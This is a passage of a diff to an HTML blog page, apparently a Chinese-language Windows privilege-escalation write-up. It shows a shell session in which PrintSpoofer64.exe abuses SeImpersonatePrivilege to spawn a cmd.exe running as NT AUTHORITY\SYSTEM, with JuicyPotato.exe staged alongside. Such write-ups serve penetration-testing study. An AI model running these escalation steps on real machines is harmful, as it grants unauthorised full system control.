+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is AEF2-0DF2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/02/2026  03:40 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>03/02/2026  03:40 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>12/06/2021  06:35 PM           347,648 JuicyPotato.exe
+</span></span><span style="display:flex;"><span>03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>        374,784 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4,617,109,504 bytes free
+</span></span></code></pre></div><p>利用提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span>PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Named pipe listening...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CreateProcessAsUser<span style="color:#f92672">()</span> OK
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
 </span></span></code></pre></div>
       </div>
     </article>
@@ -332,7 +751,7 @@
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        715 Words
+        2317 Words
       </p>
 
       <p>
@@ -357,6 +776,13 @@
         
 
         <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="http://localhost:1313/posts/windows-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Windows 提权专区</span>
+                </a>
+            </span>
             
 
             
